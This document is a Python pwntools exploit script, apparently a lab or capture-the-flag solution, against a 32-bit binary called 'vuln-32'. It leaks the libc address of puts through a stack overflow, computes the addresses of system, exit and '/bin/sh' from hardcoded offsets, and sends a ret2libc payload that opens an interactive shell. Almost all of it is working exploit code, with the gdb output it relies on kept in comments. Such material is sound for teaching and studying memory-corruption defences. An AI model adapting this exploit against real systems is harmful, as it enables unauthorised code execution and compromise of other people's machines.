#!/usr/bin/env python3

from pwn import *

offset = 612

# Pre-runtime
# gdb-peda$ p main
# $1 = {<text variable, no debug info>} 0x80491a5 <main>
# gdb-peda$ p puts
# $2 = {<text variable, no debug info>} 0x8049050 <puts@plt>
# gdb-peda$ disassemble puts
# Dump of assembler code for function puts@plt:
#   0x08049050 <+0>:     jmp    DWORD PTR ds:0x804c008
#   0x08049056 <+6>:     push   0x10
#   0x0804905b <+11>:    jmp    0x8049020



# runtime
# gdb-peda$ p system
# $1 = {<text variable, no debug info>} 0xf7c4c800 <system>
# gdb-peda$ p puts
# $2 = {<text variable, no debug info>} 0xf7c74db0 <puts>
# gdb-peda$ p exit
# $3 = {<text variable, no debug info>} 0xf7c3bc90 <exit>
# find /bin
# Searching for '/bin' in: None ranges
# Found 11 results, display max 11 items:
# libc.so.6 : 0xf7db5faa ("/bin/sh")

# calculate offsets betwwen puts and other functions
# note that /bin/sh is high so the offset is calculated inverse
offset_system = 0xf7c74db0 - 0xf7c4c800
offset_exit   = 0xf7c74db0 - 0xf7c3bc90
offset_binsh  = 0xf7db5faa - 0xf7c74db0

# exploitation Phase 1
# get a leak by running the overflow calling puts() and returning to main()
# the output will leak the real address of puts() after procecure linking 

addr_main = (0x8049196)
addr_puts = (0x08049050)
addr_puts_got= (0x0804c008)

payload = b"A"*offset
payload += p32(addr_puts)
payload += p32(addr_main)
payload += p32(addr_puts_got)

r = process('./vuln-32')
r.sendline(payload)
output = r.recvline()
output = r.recvline()
leak = u32(output[:4])
log.info('puts@libc is at: {}'.format(hex(leak))) # The leaked value is printed.

# Exploitation phase 2
# we have the leak of puts() real address
# We than get the real address of system() exit() and "/bin/sh" using the offsets

addr_system = leak - offset_system
addr_exit = leak - offset_exit
addr_binsh = leak + offset_binsh
zero_arg = (0x00000000)

log.info('system@libc is at: {}'.format(hex(addr_system))) # The leaked value is printed.
log.info('exit@libc is at: {}'.format(hex(addr_exit))) # The le
log.info('binsh@libc is at: {}'.format(hex(addr_binsh))) # The leaked value is printed.

# Prepare payload with real addresses
payload = b"A"*offset
payload += p32(addr_system)
payload += p32(addr_exit)
payload += p32(addr_binsh)
payload += p32(zero_arg)

#r.interactive()

r.sendline(payload)
r.interactive()
